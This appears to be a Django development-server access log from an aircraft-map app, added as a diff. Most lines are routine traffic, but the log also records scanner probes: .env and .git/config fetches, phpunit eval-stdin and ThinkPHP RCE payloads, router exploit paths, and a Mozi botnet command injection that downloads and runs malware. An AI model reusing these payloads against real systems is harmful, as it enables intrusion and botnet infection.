+[29/Apr/2023 04:13:10] "GET /static/maps/map.png HTTP/1.0" 200 40581
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[29/Apr/2023 04:15:12] "GET /index/ HTTP/1.0" 200 1854
+[29/Apr/2023 04:15:12] "GET /static/maps/map.png HTTP/1.0" 200 40581
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[29/Apr/2023 04:17:13] "GET /index/ HTTP/1.0" 200 1854
+[29/Apr/2023 04:17:13] "GET /static/maps/map.png HTTP/1.0" 200 40581
+[29/Apr/2023 04:17:13] "GET /favicon.ico HTTP/1.0" 404 179
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[29/Apr/2023 04:19:14] "GET /index/ HTTP/1.0" 200 2026
+[29/Apr/2023 04:19:15] "GET /static/maps/map.png HTTP/1.0" 200 41995
+[29/Apr/2023 04:21:07] "GET / HTTP/1.0" 404 179
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[29/Apr/2023 04:21:16] "GET /index/ HTTP/1.0" 200 2029
+[29/Apr/2023 04:21:16] "GET /static/maps/map.png HTTP/1.0" 200 41899
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[29/Apr/2023 04:23:17] "GET /index/ HTTP/1.0" 200 2029
+[29/Apr/2023 04:23:17] "GET /static/maps/map.png HTTP/1.0" 200 42175
+[29/Apr/2023 04:23:17] "GET /favicon.ico HTTP/1.0" 404 179
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[29/Apr/2023 04:25:19] "GET /index/ HTTP/1.0" 200 2204
+[29/Apr/2023 04:25:19] "GET /static/maps/map.png HTTP/1.0" 200 43404
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[29/Apr/2023 04:27:20] "GET /index/ HTTP/1.0" 200 2204
+[29/Apr/2023 04:27:20] "GET /static/maps/map.png HTTP/1.0" 200 43423
+[29/Apr/2023 04:27:21] "GET /favicon.ico HTTP/1.0" 404 179
+[29/Apr/2023 04:27:49] "GET /static/maps/map.png HTTP/1.0" 304 0
+[29/Apr/2023 04:28:19] "GET /static/maps/map.png HTTP/1.0" 304 0
+[29/Apr/2023 04:28:44] "GET /index/ HTTP/1.0" 200 2204
+[29/Apr/2023 04:28:44] "GET /static/maps/map.png HTTP/1.0" 200 43423
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[29/Apr/2023 04:29:30] "GET /index/ HTTP/1.0" 200 2203
+[29/Apr/2023 04:29:30] "GET /static/maps/map.png HTTP/1.0" 200 43645
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[29/Apr/2023 04:31:31] "GET /index/ HTTP/1.0" 200 2204
+[29/Apr/2023 04:31:31] "GET /static/maps/map.png HTTP/1.0" 200 43748
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[29/Apr/2023 04:33:32] "GET /index/ HTTP/1.0" 200 2204
+[29/Apr/2023 04:33:32] "GET /static/maps/map.png HTTP/1.0" 200 43849
+[29/Apr/2023 04:33:56] "GET / HTTP/1.0" 400 143
+[29/Apr/2023 04:34:21] "GET / HTTP/1.0" 404 179
+[29/Apr/2023 04:35:28] "GET / HTTP/1.0" 404 179
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[29/Apr/2023 04:35:34] "GET /index/ HTTP/1.0" 200 2203
+[29/Apr/2023 04:35:34] "GET /static/maps/map.png HTTP/1.0" 200 43995
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[29/Apr/2023 04:37:35] "GET /index/ HTTP/1.0" 200 2204
+[29/Apr/2023 04:37:35] "GET /static/maps/map.png HTTP/1.0" 200 44180
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[29/Apr/2023 04:39:37] "GET /index/ HTTP/1.0" 200 2203
+[29/Apr/2023 04:39:37] "GET /static/maps/map.png HTTP/1.0" 200 44307
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[29/Apr/2023 04:41:38] "GET /index/ HTTP/1.0" 200 2203
+[29/Apr/2023 04:41:38] "GET /static/maps/map.png HTTP/1.0" 200 44350
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[29/Apr/2023 04:43:41] "GET /index/ HTTP/1.0" 200 2029
+[29/Apr/2023 04:43:41] "GET /static/maps/map.png HTTP/1.0" 200 44337
+[29/Apr/2023 04:56:28] "GET / HTTP/1.0" 400 143
+[29/Apr/2023 04:56:29] "GET / HTTP/1.0" 400 143
+[29/Apr/2023 05:01:18] "GET / HTTP/1.0" 404 179
+[29/Apr/2023 05:19:13] "POST /boaform/admin/formLogin HTTP/1.0" 404 179
+[29/Apr/2023 05:50:38] "GET /robots.txt HTTP/1.0" 400 143
+[29/Apr/2023 06:00:05] "GET /robots.txt HTTP/1.0" 400 143
+[29/Apr/2023 06:09:52] "GET / HTTP/1.0" 400 143
+[29/Apr/2023 06:22:08] "GET / HTTP/1.0" 404 179
+[29/Apr/2023 06:26:18] "GET /sitemap_index.xml HTTP/1.0" 400 143
+[29/Apr/2023 06:26:42] "GET /sitemaps.xml HTTP/1.0" 400 143
+[29/Apr/2023 06:33:43] "GET / HTTP/1.0" 404 179
+Performing system checks...
+
+System check identified no issues (0 silenced).
+April 29, 2023 - 06:37:03
+Django version 4.1.1, using settings 'opensky_aircraft.settings'
+Starting development server at http://127.0.0.1:8000/
+Quit the server with CONTROL-C.
+[29/Apr/2023 06:37:34] "GET /sitemaps.xml HTTP/1.0" 400 143
+[29/Apr/2023 06:40:18] "GET /sitemap.txt HTTP/1.0" 400 143
+[29/Apr/2023 06:44:20] "GET /sitemap_index.xml HTTP/1.0" 400 143
+[29/Apr/2023 06:44:23] "GET / HTTP/1.0" 404 179
+[29/Apr/2023 06:51:20] "GET / HTTP/1.0" 404 179
+[29/Apr/2023 06:51:27] "POST /HNAP1/ HTTP/1.0" 404 179
+[29/Apr/2023 06:51:54] "GET /sitemap.xml HTTP/1.0" 400 143
+[29/Apr/2023 06:57:54] "GET /atom.xml HTTP/1.0" 400 143
+[29/Apr/2023 07:04:33] "GET / HTTP/1.0" 404 179
+[29/Apr/2023 07:08:13] "GET /cong.php HTTP/1.0" 400 143
+[29/Apr/2023 07:22:39] "GET /atom.xml HTTP/1.0" 400 143
+[29/Apr/2023 07:24:18] "GET / HTTP/1.0" 404 179
+[29/Apr/2023 07:46:04] "GET /sitemap.txt HTTP/1.0" 400 143
+[29/Apr/2023 07:46:05] "GET /sitemap.xml.gz HTTP/1.0" 400 143
+[29/Apr/2023 07:49:37] "GET /sitemap.xml.gz HTTP/1.0" 400 143
+[29/Apr/2023 08:02:59] "GET / HTTP/1.0" 404 179
+[29/Apr/2023 08:28:22] "GET / HTTP/1.0" 404 179
+[29/Apr/2023 09:15:20] "GET / HTTP/1.0" 404 179
+[29/Apr/2023 09:26:38] "GET / HTTP/1.0" 404 179
+[29/Apr/2023 09:28:47] "GET / HTTP/1.0" 404 179
+[29/Apr/2023 09:44:08] "GET / HTTP/1.0" 404 179
+[29/Apr/2023 09:44:08] "POST /HNAP1/ HTTP/1.0" 404 179
+[29/Apr/2023 09:44:40] "GET /.env HTTP/1.0" 404 179
+[29/Apr/2023 10:08:44] "GET / HTTP/1.0" 404 179
+[29/Apr/2023 10:24:51] "GET / HTTP/1.0" 404 179
+[29/Apr/2023 10:36:47] "GET / HTTP/1.0" 404 179
+[29/Apr/2023 10:38:45] "GET /geoserver/web/ HTTP/1.0" 404 179
+[29/Apr/2023 10:39:01] "GET /robots.txt HTTP/1.0" 400 143
+[29/Apr/2023 11:03:50] "GET / HTTP/1.0" 404 179
+[29/Apr/2023 11:23:29] "GET / HTTP/1.0" 400 143
+[29/Apr/2023 11:23:50] "GET / HTTP/1.0" 404 179
+[29/Apr/2023 11:41:05] "GET / HTTP/1.0" 404 179
+[29/Apr/2023 11:50:44] "GET / HTTP/1.0" 400 143
+[29/Apr/2023 11:54:59] "GET / HTTP/1.0" 400 143
+[29/Apr/2023 12:05:13] "GET / HTTP/1.0" 400 143
+[29/Apr/2023 12:09:55] "GET / HTTP/1.0" 404 179
+[29/Apr/2023 12:10:16] "GET /favicon.ico HTTP/1.0" 404 179
+[29/Apr/2023 12:10:21] "GET /robots.txt HTTP/1.0" 404 179
+[29/Apr/2023 12:10:25] "GET /sitemap.xml HTTP/1.0" 404 179
+[29/Apr/2023 12:16:49] "GET / HTTP/1.0" 404 179
+[29/Apr/2023 12:19:26] "POST /boaform/admin/formLogin HTTP/1.0" 404 179
+[29/Apr/2023 12:33:38] "GET /mrG6 HTTP/1.0" 404 179
+[29/Apr/2023 12:33:39] "GET /9grK HTTP/1.0" 404 179
+[29/Apr/2023 12:56:28] "GET / HTTP/1.0" 404 179
+[29/Apr/2023 13:53:40] "GET /.env HTTP/1.0" 404 179
+[29/Apr/2023 14:00:57] "GET / HTTP/1.0" 404 179
+[29/Apr/2023 14:06:32] "GET / HTTP/1.0" 404 179
+[29/Apr/2023 14:09:50] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 404 179
+[29/Apr/2023 14:38:35] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 404 179
+[29/Apr/2023 14:48:01] "GET /.env HTTP/1.0" 404 179
+[29/Apr/2023 14:53:06] "GET /solr/admin/info/system?wt=json HTTP/1.0" 404 179
+[29/Apr/2023 14:56:06] "GET /hudson HTTP/1.0" 404 179
+[29/Apr/2023 15:01:49] "GET / HTTP/1.0" 404 179
+[29/Apr/2023 15:13:28] "GET / HTTP/1.0" 404 179
+[29/Apr/2023 15:21:09] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.0" 404 179
+[29/Apr/2023 15:30:22] "GET /.env HTTP/1.0" 404 179
+[29/Apr/2023 15:30:23] "POST / HTTP/1.0" 404 179
+[29/Apr/2023 15:46:37] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.0" 404 179
+[29/Apr/2023 16:11:36] "GET / HTTP/1.0" 400 143
+[29/Apr/2023 16:11:38] "GET / HTTP/1.0" 404 179
+[29/Apr/2023 16:17:42] "GET /echo.php HTTP/1.0" 400 143
+[29/Apr/2023 16:19:40] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.0" 404 179
+[29/Apr/2023 16:33:43] "GET /console/ HTTP/1.0" 404 179
+[29/Apr/2023 17:03:01] "GET / HTTP/1.0" 404 179
+[29/Apr/2023 17:06:46] "POST /Autodiscover/Autodiscover.xml HTTP/1.0" 404 179
+[29/Apr/2023 17:07:06] "GET / HTTP/1.0" 400 143
+[29/Apr/2023 17:09:37] "GET /1682788177 HTTP/1.0" 404 179
+[29/Apr/2023 17:09:37] "POST /sdk HTTP/1.0" 404 179
+[29/Apr/2023 17:09:37] "GET / HTTP/1.0" 400 143
+[29/Apr/2023 17:09:37] "GET /HNAP1 HTTP/1.0" 404 179
+[29/Apr/2023 17:09:37] "GET /evox/about HTTP/1.0" 404 179
+[29/Apr/2023 17:10:15] "GET / HTTP/1.0" 400 143
+[29/Apr/2023 17:10:16] "GET / HTTP/1.0" 404 179
+[29/Apr/2023 17:10:24] "GET / HTTP/1.0" 404 179
+[29/Apr/2023 17:10:24] "GET /favicon.ico HTTP/1.0" 404 179
+[29/Apr/2023 17:24:28] "GET /portal/redlion HTTP/1.0" 404 179
+[29/Apr/2023 17:26:29] "GET /_ignition/execute-solution HTTP/1.0" 404 179
+[29/Apr/2023 17:37:33] "GET /actuator/health HTTP/1.0" 404 179
+[29/Apr/2023 17:55:35] "GET / HTTP/1.0" 404 179
+[29/Apr/2023 17:59:45] "GET / HTTP/1.0" 400 143
+[29/Apr/2023 18:00:38] "GET / HTTP/1.0" 404 179
+[29/Apr/2023 18:06:21] "GET / HTTP/1.0" 404 179
+[29/Apr/2023 18:33:38] "GET /.env HTTP/1.0" 404 179
+[29/Apr/2023 18:33:40] "POST / HTTP/1.0" 404 179
+[29/Apr/2023 18:42:38] "GET / HTTP/1.0" 404 179
+[29/Apr/2023 18:47:06] "GET /.env HTTP/1.0" 404 179
+[29/Apr/2023 18:54:27] "GET /index HTTP/1.0" 301 0
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[29/Apr/2023 18:54:29] "GET /index/ HTTP/1.0" 200 1854
+[29/Apr/2023 18:54:29] "GET /static/maps/map.png HTTP/1.0" 200 35307
+[29/Apr/2023 18:54:29] "GET /favicon.ico HTTP/1.0" 404 179
+[29/Apr/2023 18:54:31] "GET /index/ HTTP/1.0" 200 1854
+[29/Apr/2023 18:54:31] "GET /static/maps/map.png HTTP/1.0" 304 0
+[29/Apr/2023 18:54:32] "GET /index/ HTTP/1.0" 200 1854
+[29/Apr/2023 18:54:32] "GET /static/maps/map.png HTTP/1.0" 304 0
+[29/Apr/2023 18:54:36] "GET /index/ HTTP/1.0" 200 1854
+[29/Apr/2023 18:54:36] "GET /static/maps/map.png HTTP/1.0" 304 0
+[29/Apr/2023 18:55:35] "GET / HTTP/1.0" 404 179
+[29/Apr/2023 18:55:42] "GET /static/maps/map.png HTTP/1.0" 304 0
+[29/Apr/2023 18:55:44] "GET /index/ HTTP/1.0" 200 1854
+[29/Apr/2023 18:55:51] "GET /index/ HTTP/1.0" 200 1854
+[29/Apr/2023 18:55:51] "GET /static/maps/map.png HTTP/1.0" 304 0
+[29/Apr/2023 18:56:04] "GET /index/ HTTP/1.0" 200 1854
+[29/Apr/2023 18:56:04] "GET /static/maps/map.png HTTP/1.0" 304 0
+[29/Apr/2023 18:56:07] "GET /index/ HTTP/1.0" 200 1854
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[29/Apr/2023 18:58:09] "GET /index/ HTTP/1.0" 200 1854
+[29/Apr/2023 18:58:09] "GET /static/maps/map.png HTTP/1.0" 200 35307
+[29/Apr/2023 18:59:20] "GET / HTTP/1.0" 404 179
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[29/Apr/2023 19:00:11] "GET /index/ HTTP/1.0" 200 1854
+[29/Apr/2023 19:00:11] "GET /static/maps/map.png HTTP/1.0" 200 35307
+[29/Apr/2023 19:04:13] "GET /actuator/gateway/routes HTTP/1.0" 404 179
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[29/Apr/2023 19:06:15] "GET /index/ HTTP/1.0" 200 1854
+[29/Apr/2023 19:06:15] "GET /static/maps/map.png HTTP/1.0" 200 35307
+[29/Apr/2023 19:08:53] "GET / HTTP/1.0" 404 179
+[29/Apr/2023 19:20:32] "GET / HTTP/1.0" 404 179
+[29/Apr/2023 19:33:16] "GET /geoserver HTTP/1.0" 404 179
+[29/Apr/2023 19:40:29] "GET /.env HTTP/1.0" 404 179
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[29/Apr/2023 19:50:31] "GET /index/ HTTP/1.0" 200 2026
+[29/Apr/2023 19:50:32] "GET /static/maps/map.png HTTP/1.0" 200 35307
+[29/Apr/2023 20:03:28] "GET / HTTP/1.0" 404 179
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[29/Apr/2023 20:03:31] "GET /index/ HTTP/1.0" 200 2563
+[29/Apr/2023 20:03:31] "GET /static/maps/map.png HTTP/1.0" 200 41559
+[29/Apr/2023 20:12:25] "GET / HTTP/1.0" 404 179
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[29/Apr/2023 20:24:04] "GET /index/ HTTP/1.0" 200 2560
+[29/Apr/2023 20:24:04] "GET /static/maps/map.png HTTP/1.0" 200 42652
+[29/Apr/2023 20:49:46] "GET / HTTP/1.0" 404 179
+[29/Apr/2023 20:58:31] "GET / HTTP/1.0" 404 179
+[29/Apr/2023 21:34:10] "GET /.env HTTP/1.0" 404 179
+[29/Apr/2023 21:34:11] "POST / HTTP/1.0" 404 179
+[29/Apr/2023 21:39:07] "GET / HTTP/1.0" 404 179
+[29/Apr/2023 21:39:07] "GET / HTTP/1.0" 400 143
+[29/Apr/2023 21:47:22] "GET / HTTP/1.0" 400 143
+[29/Apr/2023 21:47:37] "GET / HTTP/1.0" 400 143
+[29/Apr/2023 21:48:23] "GET / HTTP/1.0" 400 143
+[29/Apr/2023 22:19:17] "GET / HTTP/1.0" 404 179
+[29/Apr/2023 22:29:56] "GET / HTTP/1.0" 404 179
+[29/Apr/2023 23:03:46] "GET /sitemap.xml.gz HTTP/1.0" 400 143
+[29/Apr/2023 23:06:47] "GET / HTTP/1.0" 400 143
+[29/Apr/2023 23:09:02] "POST /boaform/admin/formLogin HTTP/1.0" 404 179
+[29/Apr/2023 23:18:12] "GET /robots.txt HTTP/1.0" 400 143
+[29/Apr/2023 23:23:38] "GET / HTTP/1.0" 404 179
+[29/Apr/2023 23:31:43] "POST /boaform/admin/formLogin HTTP/1.0" 404 179
+[29/Apr/2023 23:34:10] "GET / HTTP/1.0" 404 179
+[29/Apr/2023 23:40:13] "GET /.env HTTP/1.0" 400 143
+[29/Apr/2023 23:40:14] "GET /.env HTTP/1.0" 400 143
+[29/Apr/2023 23:40:50] "GET /sitemap_index.xml HTTP/1.0" 400 143
+[29/Apr/2023 23:41:26] "GET /sitemaps.xml HTTP/1.0" 400 143
+[29/Apr/2023 23:49:00] "GET / HTTP/1.0" 404 179
+[29/Apr/2023 23:50:26] "GET / HTTP/1.0" 404 179
+[29/Apr/2023 23:51:35] "GET / HTTP/1.0" 404 179
+[29/Apr/2023 23:52:18] "GET /sitemaps.xml HTTP/1.0" 400 143
+[29/Apr/2023 23:54:46] "GET /sitemap.txt HTTP/1.0" 400 143
+[29/Apr/2023 23:58:51] "GET /sitemap_index.xml HTTP/1.0" 400 143
+[30/Apr/2023 00:06:48] "GET /sitemap.xml HTTP/1.0" 400 143
+[30/Apr/2023 00:07:51] "GET / HTTP/1.0" 404 179
+[30/Apr/2023 00:25:01] "GET /atom.xml HTTP/1.0" 400 143
+[30/Apr/2023 00:33:35] "GET /.env HTTP/1.0" 404 179
+[30/Apr/2023 00:33:35] "POST / HTTP/1.0" 404 179
+[30/Apr/2023 00:37:32] "GET /atom.xml HTTP/1.0" 400 143
+[30/Apr/2023 00:41:32] "GET /sitemap.xml HTTP/1.0" 400 143
+[30/Apr/2023 00:56:13] "GET / HTTP/1.0" 404 179
+[30/Apr/2023 00:58:40] "GET /sitemap.txt HTTP/1.0" 400 143
+[30/Apr/2023 01:02:21] "GET / HTTP/1.0" 404 179
+[30/Apr/2023 01:07:19] "GET / HTTP/1.0" 404 179
+[30/Apr/2023 01:07:45] "GET / HTTP/1.0" 404 179
+[30/Apr/2023 01:13:25] "GET /sitemap.xml.gz HTTP/1.0" 400 143
+[30/Apr/2023 01:14:56] "GET / HTTP/1.0" 404 179
+[30/Apr/2023 01:14:57] "POST /HNAP1/ HTTP/1.0" 404 179
+[30/Apr/2023 01:40:38] "GET / HTTP/1.0" 400 143
+[30/Apr/2023 01:44:12] "GET / HTTP/1.0" 404 179
+[30/Apr/2023 02:04:07] "GET / HTTP/1.0" 400 143
+[30/Apr/2023 02:13:22] "GET /voddetail/34412.html HTTP/1.0" 400 143
+[30/Apr/2023 02:23:49] "GET /.git/config HTTP/1.0" 404 179
+[30/Apr/2023 02:23:50] "GET /.git/config HTTP/1.0" 404 179
+[30/Apr/2023 02:23:54] "GET /.git/config HTTP/1.0" 404 179
+[30/Apr/2023 02:23:55] "GET /.git/config HTTP/1.0" 404 179
+[30/Apr/2023 02:23:58] "GET / HTTP/1.0" 404 179
+[30/Apr/2023 02:27:14] "GET / HTTP/1.0" 404 179
+[30/Apr/2023 02:30:26] "GET /geoserver/web/ HTTP/1.0" 404 179
+[30/Apr/2023 03:15:56] "GET / HTTP/1.0" 404 179
+[30/Apr/2023 03:24:50] "GET / HTTP/1.0" 404 179
+[30/Apr/2023 03:36:08] "GET /wp-admin/shell20211028.php HTTP/1.0" 400 143
+[30/Apr/2023 03:36:20] "GET /wp-admin/wp-2019.php HTTP/1.0" 400 143
+[30/Apr/2023 03:46:32] "GET / HTTP/1.0" 404 179
+[30/Apr/2023 03:46:33] "POST /HNAP1/ HTTP/1.0" 404 179
+[30/Apr/2023 04:06:00] "GET / HTTP/1.0" 404 179
+[30/Apr/2023 04:34:50] "GET / HTTP/1.0" 404 179
+[30/Apr/2023 04:38:30] "GET / HTTP/1.0" 404 179
+[30/Apr/2023 05:09:05] "GET / HTTP/1.0" 404 179
+[30/Apr/2023 05:29:43] "GET / HTTP/1.0" 404 179
+[30/Apr/2023 05:29:43] "POST /HNAP1/ HTTP/1.0" 404 179
+[30/Apr/2023 05:56:44] "GET / HTTP/1.0" 404 179
+[30/Apr/2023 06:07:44] "GET /.env HTTP/1.0" 404 179
+[30/Apr/2023 07:00:34] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.0" 404 179
+[30/Apr/2023 07:09:59] "GET / HTTP/1.0" 400 143
+[30/Apr/2023 07:29:05] "GET / HTTP/1.0" 404 179
+[30/Apr/2023 07:29:05] "GET /client/get_targets HTTP/1.0" 404 179
+[30/Apr/2023 07:39:20] "GET / HTTP/1.0" 404 179
+[30/Apr/2023 07:46:35] "HEAD / HTTP/1.0" 404 179
+[30/Apr/2023 07:50:57] "GET /wp-login.php HTTP/1.0" 400 143
+[30/Apr/2023 08:04:10] "GET / HTTP/1.0" 400 143
+[30/Apr/2023 08:04:10] "GET / HTTP/1.0" 400 143
+[30/Apr/2023 08:06:28] "GET / HTTP/1.0" 404 179
+[30/Apr/2023 08:21:55] "GET /wp-login.php HTTP/1.0" 400 143
+[30/Apr/2023 08:30:24] "GET / HTTP/1.0" 404 179
+[30/Apr/2023 08:33:47] "GET /.env HTTP/1.0" 404 179
+[30/Apr/2023 08:33:48] "POST / HTTP/1.0" 404 179
+[30/Apr/2023 09:13:32] "GET / HTTP/1.0" 404 179
+[30/Apr/2023 09:29:39] "GET / HTTP/1.0" 400 143
+[30/Apr/2023 09:32:03] "GET /.env HTTP/1.0" 400 143
+[30/Apr/2023 09:32:04] "POST / HTTP/1.0" 400 143
+[30/Apr/2023 09:32:05] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 400 143
+[30/Apr/2023 09:34:56] "GET /.env HTTP/1.0" 400 143
+[30/Apr/2023 09:34:57] "POST / HTTP/1.0" 400 143
+[30/Apr/2023 09:35:03] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 400 143
+[30/Apr/2023 09:43:16] "GET /?Z76889836042Q1 HTTP/1.0" 400 143
+[30/Apr/2023 09:53:54] "GET /muieblackcat HTTP/1.0" 404 179
+[30/Apr/2023 09:53:55] "GET //phpMyAdmin/scripts/setup.php HTTP/1.0" 404 179
+[30/Apr/2023 09:53:55] "GET //phpmyadmin/scripts/setup.php HTTP/1.0" 404 179
+[30/Apr/2023 09:53:55] "GET //pma/scripts/setup.php HTTP/1.0" 404 179
+[30/Apr/2023 09:53:56] "GET //myadmin/scripts/setup.php HTTP/1.0" 404 179
+[30/Apr/2023 09:53:56] "GET //MyAdmin/scripts/setup.php HTTP/1.0" 404 179
+[30/Apr/2023 10:09:33] "GET / HTTP/1.0" 404 179
+[30/Apr/2023 10:25:54] "GET /.env HTTP/1.0" 404 179
+[30/Apr/2023 10:25:55] "POST / HTTP/1.0" 404 179
+[30/Apr/2023 11:01:10] "GET / HTTP/1.0" 400 143
+[30/Apr/2023 11:09:26] "GET / HTTP/1.0" 404 179
+[30/Apr/2023 11:27:25] "GET / HTTP/1.0" 404 179
+[30/Apr/2023 11:31:36] "GET /.env HTTP/1.0" 404 179
+[30/Apr/2023 11:31:37] "POST / HTTP/1.0" 404 179
+[30/Apr/2023 11:53:51] "GET / HTTP/1.0" 404 179
+[30/Apr/2023 11:58:25] "GET / HTTP/1.0" 404 179
+[30/Apr/2023 11:58:44] "GET / HTTP/1.0" 404 179
+[30/Apr/2023 12:11:22] "GET / HTTP/1.0" 404 179
+[30/Apr/2023 12:26:54] "GET / HTTP/1.0" 400 143
+[30/Apr/2023 12:27:10] "GET / HTTP/1.0" 400 143
+[30/Apr/2023 12:27:42] "GET / HTTP/1.0" 400 143
+[30/Apr/2023 12:27:43] "GET / HTTP/1.0" 400 143
+[30/Apr/2023 12:32:39] "GET /a2Tu HTTP/1.0" 404 179
+[30/Apr/2023 12:32:40] "GET /mn9I HTTP/1.0" 404 179
+[30/Apr/2023 12:39:12] "GET / HTTP/1.0" 404 179
+[30/Apr/2023 12:39:13] "GET /robots.txt HTTP/1.0" 400 143
+[30/Apr/2023 13:12:22] "GET / HTTP/1.0" 404 179
+[30/Apr/2023 13:18:49] "GET / HTTP/1.0" 404 179
+[30/Apr/2023 13:18:49] "POST /HNAP1/ HTTP/1.0" 404 179
+[30/Apr/2023 13:22:33] "GET / HTTP/1.0" 404 179
+[30/Apr/2023 13:31:22] "GET / HTTP/1.0" 404 179
+[30/Apr/2023 13:47:56] "GET / HTTP/1.0" 404 179
+[30/Apr/2023 14:11:08] "GET / HTTP/1.0" 404 179
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[30/Apr/2023 14:24:40] "GET /index/ HTTP/1.0" 200 2388
+[30/Apr/2023 14:24:40] "GET /static/maps/map.png HTTP/1.0" 200 39933
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[30/Apr/2023 14:26:42] "GET /index/ HTTP/1.0" 200 2388
+[30/Apr/2023 14:26:42] "GET /static/maps/map.png HTTP/1.0" 200 40131
+/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py:197: FutureWarning: The `op` parameter is deprecated and will be removed in a future release. Please use the `predicate` parameter instead.
+  response = wrapped_callback(request, *callback_args, **callback_kwargs)
+[30/Apr/2023 14:28:44] "GET /index/ HTTP/1.0" 200 2215
